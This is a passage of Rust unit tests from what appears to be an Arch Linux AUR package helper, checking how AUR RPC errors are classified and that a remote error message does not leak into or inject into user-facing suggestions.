        assert!(format!("{error:#}").contains("HTTP 503"), "{error:#}");
        assert_eq!(crate::core::error::suggest_for_anyhow(&error), None);
        Ok(())
    }

    #[test]
    fn aur_update_availability_does_not_hide_permanent_http_or_local_errors() {
        let denied = ensure_aur_rpc_success(reqwest::StatusCode::FORBIDDEN)
            .expect_err("HTTP 403 is a hard listing failure");
        assert!(!update_source_unavailable(&denied));
        let invalid = decode_aur_rpc_body::<AurResponse>(b"{").expect_err("invalid response");
        assert!(!update_source_unavailable(&invalid));
        let local = anyhow::anyhow!("Failed to load AUR update filters from pacman.conf");
        assert!(!update_source_unavailable(&local));
    }

    #[tokio::test]
    async fn failed_update_remote_envelope_does_not_leak_or_inject_guidance() -> Result<()> {
        let body = br#"{"type":"error","error":"remote-secret: permission denied","results":[]}"#;
        // This response is deliberately outside the retryable status path.
        let reply = format!(
            "HTTP/1.1 200 OK\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
            body.len(),
            String::from_utf8_lossy(body)
        );
        let error = update_error_from_reply(Some(reply.as_bytes()), 1).await?;
        assert_eq!(crate::core::error::suggest_for_anyhow(&error), None);
        Ok(())
    }
}
